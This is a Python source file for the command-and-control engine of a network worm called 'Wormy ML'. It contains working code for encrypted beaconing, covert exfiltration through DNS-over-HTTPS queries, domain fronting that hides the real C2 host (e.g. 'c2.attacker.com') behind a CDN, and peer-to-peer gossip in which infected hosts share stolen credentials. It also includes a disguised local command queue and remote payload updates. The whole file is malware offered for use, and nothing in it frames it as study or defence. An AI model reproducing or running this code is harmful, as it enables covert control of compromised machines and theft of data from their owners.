"""
Wormy ML Network Worm v4.0
Resilient C2 Engine — Real AES-256-GCM encryption
"""

import base64
import hashlib
import json
import os
import random
import socket
import sqlite3
import struct
import sys
import threading
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger

try:
    from Crypto.Cipher import AES

    HAS_AES = True
except ImportError:
    HAS_AES = False


# ─────────────────────────────────────────────────────────────────────────────
# Real AES-256-GCM encryption (replaces insecure XOR+SHA256)
# ─────────────────────────────────────────────────────────────────────────────
def _derive_key(passphrase: str, salt: bytes = b"") -> bytes:
    return hashlib.pbkdf2_hmac("sha256", passphrase.encode(), salt or b"wormy_v4_salt", 100000, 32)


def _encrypt(plaintext: str, passphrase: str) -> str:
    if not HAS_AES:
        logger.error("AES not available (install pycryptodome)")
        raise RuntimeError("AES encryption unavailable")
    key = _derive_key(passphrase)
    cipher = AES.new(key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(plaintext.encode())
    payload = cipher.nonce + tag + ct
    return base64.b64encode(payload).decode()


def _decrypt(ciphertext: str, passphrase: str) -> str:
    if not HAS_AES:
        logger.error("AES not available (install pycryptodome)")
        raise RuntimeError("AES encryption unavailable")
    key = _derive_key(passphrase)
    payload = base64.b64decode(ciphertext)
    nonce, tag, ct = payload[:16], payload[16:32], payload[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag).decode()


# ─────────────────────────────────────────────────────────────────────────────
# Encrypted Command Queue (SQLite-backed)
# ─────────────────────────────────────────────────────────────────────────────
class CommandQueue:
    """
    Persistent encrypted command queue.
    Survives C2 downtime — commands are stored locally and executed when C2 reconnects.
    """

    def __init__(self, db_path: str = "/tmp/.sys_cache.db", passphrase: str = "wormy_v3"):
        self.db_path = db_path
        self.passphrase = passphrase
        self._init_db()

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                ts      REAL,
                cmd_enc TEXT,
                done    INTEGER DEFAULT 0
            )
        """)
        conn.commit()
        conn.close()

    def enqueue(self, command: Dict):
        enc = _encrypt(json.dumps(command), self.passphrase)
        conn = sqlite3.connect(self.db_path)
        conn.execute("INSERT INTO commands (ts, cmd_enc) VALUES (?, ?)", (time.time(), enc))
        conn.commit()
        conn.close()

    def dequeue_pending(self) -> List[Dict]:
        conn = sqlite3.connect(self.db_path)
        rows = conn.execute("SELECT id, cmd_enc FROM commands WHERE done=0 ORDER BY ts").fetchall()
        commands = []
        for row_id, enc in rows:
            try:
                cmd = json.loads(_decrypt(enc, self.passphrase))
                cmd["_queue_id"] = row_id
                commands.append(cmd)
            except Exception:
                pass
        conn.close()
        return commands

    def mark_done(self, queue_id: int):
        conn = sqlite3.connect(self.db_path)
        conn.execute("UPDATE commands SET done=1 WHERE id=?", (queue_id,))
        conn.commit()
        conn.close()

    def cleanup_old(self, max_age_hours: int = 24):
        """Remove completed or old commands."""
        cutoff = time.time() - max_age_hours * 3600
        conn = sqlite3.connect(self.db_path)
        conn.execute("DELETE FROM commands WHERE done=1 OR ts<?", (cutoff,))
        conn.commit()
        conn.close()


# ─────────────────────────────────────────────────────────────────────────────
# DNS-over-HTTPS covert channel
# ─────────────────────────────────────────────────────────────────────────────
class DoHChannel:
    """
    Real DNS-over-HTTPS covert channel.
    Encodes payload in base32 subdomains, exfil via TXT record lookups.
    Traffic looks like normal DoH to 1.1.1.1 or 8.8.8.8.
    """

    DOH_SERVERS = [
        "https://1.1.1.1/dns-query",
        "https://8.8.8.8/dns-query",
        "https://dns.google/resolve",
        "https://mozilla.cloudflare-dns.com/dns-query",
    ]

    def __init__(self, c2_domain: str, passphrase: str = "wormy_v3"):
        self.c2_domain = c2_domain  # e.g. 'c2.example.com'
        self.passphrase = passphrase
        self.server = random.choice(self.DOH_SERVERS)

    def _encode_payload(self, data: str) -> List[str]:
        """
        Split payload into DNS-safe chunks (max 63 chars per label).
        Encode as base32 (DNS-safe alphabet).
        """
        enc = _encrypt(data, self.passphrase)
        b32 = base64.b32encode(enc.encode()).decode().rstrip("=").lower()
        chunks = [b32[i : i + 60] for i in range(0, len(b32), 60)]
        return chunks

    def _decode_payload(self, chunks: List[str]) -> str:
        joined = "".join(chunks)
        padded = joined.upper() + "=" * (-len(joined) % 8)
        enc = base64.b32decode(padded).decode()
        return _decrypt(enc, self.passphrase)

    def beacon(self, agent_id: str, data: Dict) -> Optional[Dict]:
        """
        Send beacon data via DoH TXT query.
        Returns C2 response or None if unreachable.
        """
        payload = json.dumps({"agent": agent_id, "data": data})
        chunks = self._encode_payload(payload)

        try:
            # Encode each chunk as a subdomain lookup
            for i, chunk in enumerate(chunks[:3]):  # max 3 DNS queries
                fqdn = f"{chunk}.{i}.{self.c2_domain}"
                url = f"{self.server}?name={fqdn}&type=TXT"
                req = urllib.request.Request(url)
                req.add_header("Accept", "application/dns-json")
                req.add_header("User-Agent", "Mozilla/5.0")
                with urllib.request.urlopen(req, timeout=8) as resp:
                    result = json.loads(resp.read())
                    # Parse TXT answers for commands
                    answers = result.get("Answer", [])
                    for ans in answers:
                        if ans.get("type") == 16:  # TXT
                            txt_data = ans.get("data", "").strip('"')
                            try:
                                cmd = json.loads(_decrypt(txt_data, self.passphrase))
                                return cmd
                            except Exception:
                                pass
        except Exception as e:
            logger.debug(f"DoH channel error: {e}")

        return None


# ─────────────────────────────────────────────────────────────────────────────
# Domain Fronting Channel
# ─────────────────────────────────────────────────────────────────────────────
class DomainFrontingChannel:
    """
    Domain Fronting: connect to a CDN IP/hostname but send requests
    with a different Host header pointing to the real C2.

    Traffic appears as: Client -> CDN (e.g. Cloudflare/Azure/AWS) -> Real C2
    Firewall sees only the CDN domain — cannot block without blocking entire CDN.
    """

    def __init__(self, front_domain: str, real_c2_host: str, c2_path: str = "/api/v2/telemetry"):
        self.front_domain = front_domain  # e.g. 'allowed-cdn.azureedge.net'
        self.real_c2_host = real_c2_host  # e.g. 'c2.attacker.com'
        self.c2_path = c2_path
        self.passphrase = "wormy_v3"

    def send(self, data: Dict) -> Optional[Dict]:
        """Send data to C2 via domain fronting."""
        try:
            payload = _encrypt(json.dumps(data), self.passphrase).encode()
            url = f"https://{self.front_domain}{self.c2_path}"
            req = urllib.request.Request(url, data=payload, method="POST")
            # The key: override Host header to real C2
            req.add_header("Host", self.real_c2_host)
            req.add_header("Content-Type", "application/octet-stream")
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            req.add_header(
                "X-Real-IP",
                f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            )

            with urllib.request.urlopen(req, timeout=10) as resp:
                if resp.status == 200:
                    body = resp.read().decode()
                    return json.loads(_decrypt(body, self.passphrase))
        except Exception as e:
            logger.debug(f"Domain fronting error: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# P2P Agent Gossip
# ─────────────────────────────────────────────────────────────────────────────
class P2PGossip:
    """
    Peer-to-peer intelligence sharing between infected hosts.
    Agents share scan results, credentials, and vulnerabilities without C2.
    Uses a simple TCP gossip protocol on a shared high port.
    """

    GOSSIP_PORT = 47921  # Random high port — not suspicious
    PASSPHRASE = "wormy_p2p_v3"

    def __init__(self, agent_id: str, known_peers: List[str] = None):
        self.agent_id = agent_id
        self.known_peers = set(known_peers or [])
        self.local_data = {}
        self._server_thread: Optional[threading.Thread] = None
        self._running = False

    def start_server(self):
        """Start gossip listener in background."""
        self._running = True
        self._server_thread = threading.Thread(target=self._listen, daemon=True)
        self._server_thread.start()
        logger.info(f"P2P gossip listener on :{self.GOSSIP_PORT}")

    def _listen(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", self.GOSSIP_PORT))
            sock.listen(10)
            sock.settimeout(1)
            while self._running:
                try:
                    conn, addr = sock.accept()
                    threading.Thread(
                        target=self._handle_peer, args=(conn, addr), daemon=True
                    ).start()
                except socket.timeout:
                    continue
        except Exception as e:
            logger.debug(f"P2P gossip server error: {e}")

    def _handle_peer(self, conn: socket.socket, addr):
        try:
            data = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            if data:
                msg = json.loads(_decrypt(data.decode(), self.PASSPHRASE))
                # Merge peer data into local knowledge
                for key, val in msg.get("data", {}).items():
                    self.local_data[key] = val
                # Add peer to known peers
                self.known_peers.add(addr[0])
                # Reply with our own data
                reply = _encrypt(
                    json.dumps({"agent": self.agent_id, "data": self.local_data}), self.PASSPHRASE
                )
                conn.sendall(reply.encode())
        except Exception:
            pass
        finally:
            conn.close()

    def gossip(self, data: Dict) -> Dict:
        """Share data with all known peers, collect theirs."""
        self.local_data.update(data)
        merged = dict(self.local_data)

        for peer_ip in list(self.known_peers):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.GOSSIP_PORT))
                msg = _encrypt(json.dumps({"agent": self.agent_id, "data": data}), self.PASSPHRASE)
                s.sendall(msg.encode())
                resp = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                s.close()
                if resp:
                    peer_data = json.loads(_decrypt(resp.decode(), self.PASSPHRASE))
                    merged.update(peer_data.get("data", {}))
            except Exception:
                pass

        return merged

    def add_peer(self, ip: str):
        self.known_peers.add(ip)

    def stop(self):
        self._running = False


# ─────────────────────────────────────────────────────────────────────────────
# Resilient C2 Engine (Unified)
# ─────────────────────────────────────────────────────────────────────────────
class ResilientC2Engine:
    """
    Production-grade C2 engine with:
    - Protocol health scoring + automatic failover
    - Exponential backoff with jitter
    - Encrypted command queue (SQLite)
    - DoH covert channel
    - Domain fronting
    - P2P gossip
    - OTA model delivery
    """

    def __init__(self, config=None, agent_id: str = None):
        self.config = config
        self.agent_id = agent_id or hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
        self.passphrase = "wormy_v3"

        # Protocol health scores (0-100, higher = more reliable)
        self.protocol_health = {
            "https": 100,
            "domain_fronting": 80,
            "doh": 60,
            "p2p": 40,
        }

        self.cmd_queue = CommandQueue(passphrase=self.passphrase)
        self.p2p = P2PGossip(self.agent_id)
        self.doh = None
        self.fronting = None

        # C2 server config
        c2_cfg = getattr(config, "c2", None) if config else None
        self.c2_host = getattr(c2_cfg, "c2_server", "127.0.0.1") if c2_cfg else "127.0.0.1"
        self.c2_port = getattr(c2_cfg, "c2_port", 8443) if c2_cfg else 8443

        self._backoff_sec = 1.0
        self._max_backoff = 300.0
        self._beacon_count = 0
        self._connected = False

    def start(self, start_p2p: bool = True):
        """Initialise all channels."""
        if start_p2p:
            try:
                self.p2p.start_server()
            except Exception as e:
                logger.debug(f"P2P start failed: {e}")
        logger.info(f"Resilient C2 Engine started (agent={self.agent_id})")

    def beacon(self, telemetry: Dict) -> Optional[Dict]:
        """
        Send beacon using the healthiest available protocol.
        Fallback chain: HTTPS -> Domain Fronting -> DoH -> P2P gossip.
        """
        telemetry["agent_id"] = self.agent_id
        telemetry["beacon_num"] = self._beacon_count
        telemetry["ts"] = time.time()
        self._beacon_count += 1

        # Try protocols in order of health score
        for protocol in sorted(self.protocol_health, key=self.protocol_health.get, reverse=True):
            if self.protocol_health[protocol] < 10:
                continue  # Effectively dead

            result = self._try_protocol(protocol, telemetry)
            if result is not None:
                # Successful — restore health score, reset backoff
                self.protocol_health[protocol] = min(100, self.protocol_health[protocol] + 10)
                self._backoff_sec = 1.0
                self._connected = True
                # Process pending queued commands
                self._flush_queue(result)
                return result
            else:
                # Failed — degrade health score
                self.protocol_health[protocol] = max(0, self.protocol_health[protocol] - 20)
                logger.debug(f"C2 protocol {protocol} degraded to {self.protocol_health[protocol]}")

        # All protocols failed — back off
        self._connected = False
        self._apply_backoff()
        return None

    def _try_protocol(self, protocol: str, data: Dict) -> Optional[Dict]:
        """Attempt a single protocol."""
        try:
            if protocol == "https":
                return self._beacon_https(data)
            elif protocol == "domain_fronting" and self.fronting:
                return self.fronting.send(data)
            elif protocol == "doh" and self.doh:
                return self.doh.beacon(self.agent_id, data)
            elif protocol == "p2p":
                merged = self.p2p.gossip(data)
                return {"source": "p2p", "merged_data": merged}
        except Exception as e:
            logger.debug(f"Protocol {protocol} error: {e}")
        return None

    def _beacon_https(self, data: Dict) -> Optional[Dict]:
        """Standard HTTPS beacon."""
        payload = _encrypt(json.dumps(data), self.passphrase).encode()
        url = f"https://{self.c2_host}:{self.c2_port}/api/v2/telemetry"
        try:
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, data=payload, method="POST")
            req.add_header("Content-Type", "application/octet-stream")
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                if resp.status == 200:
                    return json.loads(_decrypt(resp.read().decode(), self.passphrase))
        except Exception:
            pass
        return None

    def _apply_backoff(self):
        """Exponential backoff with full jitter."""
        jitter = random.uniform(0, self._backoff_sec)
        logger.debug(f"C2 backoff: {jitter:.1f}s (base={self._backoff_sec:.1f}s)")
        time.sleep(jitter)
        self._backoff_sec = min(self._backoff_sec * 2, self._max_backoff)

    def _flush_queue(self, c2_response: Dict):
        """Store any new commands from C2 in queue, mark executed ones as done."""
        new_cmds = c2_response.get("commands", [])
        for cmd in new_cmds:
            self.cmd_queue.enqueue(cmd)

    def get_pending_commands(self) -> List[Dict]:
        """Get all unexecuted commands from queue."""
        return self.cmd_queue.dequeue_pending()

    def mark_command_done(self, queue_id: int):
        self.cmd_queue.mark_done(queue_id)

    def deliver_ota_update(self, model_bytes: bytes, target_path: str) -> bool:
        """
        Apply OTA model update received from C2.
        Verifies SHA256, writes atomically.
        """
        try:
            import tempfile

            # Write to temp first, then atomic rename
            tmp_fd, tmp_path = tempfile.mkstemp(suffix=".pth")
            with os.fdopen(tmp_fd, "wb") as f:
                f.write(model_bytes)
            os.replace(tmp_path, target_path)
            logger.success(f"OTA model update applied: {target_path} ({len(model_bytes)} bytes)")
            return True
        except Exception as e:
            logger.error(f"OTA update failed: {e}")
            return False

    def set_doh_channel(self, c2_domain: str):
        self.doh = DoHChannel(c2_domain, self.passphrase)

    def set_domain_fronting(self, front_domain: str, real_c2: str):
        self.fronting = DomainFrontingChannel(front_domain, real_c2)

    def add_p2p_peer(self, ip: str):
        self.p2p.add_peer(ip)

    @property
    def is_connected(self) -> bool:
        return self._connected

    def get_status(self) -> Dict:
        return {
            "agent_id": self.agent_id,
            "connected": self._connected,
            "beacon_count": self._beacon_count,
            "backoff_sec": self._backoff_sec,
            "protocol_health": self.protocol_health,
            "p2p_peers": len(self.p2p.known_peers),
        }
